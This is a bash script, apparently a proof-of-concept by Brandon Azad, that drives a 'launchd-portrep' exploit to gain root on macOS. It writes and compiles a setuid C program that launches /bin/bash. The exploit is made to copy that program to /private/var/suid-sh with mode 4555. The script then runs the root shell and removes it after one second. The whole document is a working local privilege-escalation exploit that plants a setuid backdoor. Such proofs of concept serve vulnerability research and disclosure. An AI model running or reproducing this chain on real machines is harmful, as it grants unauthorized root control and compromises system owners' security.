#! /bin/bash
#
# launchd-portrep-rootsh.sh
# Brandon Azad
#
# An example using launchd-portrep to get a root shell. Requires developer tools.
#

cd "$( dirname "${BASH_SOURCE[0]}" )"

error() {
	echo "$1"
	exit 1
}

make -s || error "Could not build launchd-portrep"

cat << EOF > suid-sh.c || error "Could not write suid-sh.c"
#include <unistd.h>

int main(int argc, char **argv) {
	seteuid(0);
	setuid(0);
	setgid(0);
	argv[0] = "/bin/bash";
	return execve(argv[0], argv, NULL);
}
EOF

clang suid-sh.c -o suid-sh || error "Failed to compile suid-sh.c to suid-sh"

TARGET_SHELL="/private/var/suid-sh"
SHELL_COMMAND="$(which cp) $(pwd)/suid-sh $TARGET_SHELL; $(which chmod) 4555 $TARGET_SHELL"

./launchd-portrep "$SHELL_COMMAND" || error "launchd-portrep failed"

[ -f "$TARGET_SHELL" ] || error "Exploit payload failed to create $TARGET_SHELL"

echo "Launching $TARGET_SHELL"

# We'll remove the file automatically after one second.
( "$TARGET_SHELL" -c "sleep 1; rm '$TARGET_SHELL'") &

exec "$TARGET_SHELL"
